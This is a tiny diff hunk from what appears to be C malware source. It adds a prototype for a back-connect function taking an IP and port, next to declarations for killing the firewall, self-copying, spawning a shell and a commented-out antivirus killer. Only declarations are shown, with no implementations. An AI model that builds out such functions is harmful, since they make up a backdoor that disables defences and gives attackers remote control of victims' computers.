@@ -7,6 +7,8 @@
 /* functions */
 
 //void kill_av();
+
+int bck_cnct(const char *ip, int port);
 int kill_frwl();
 int auto_copy();
 int shell();
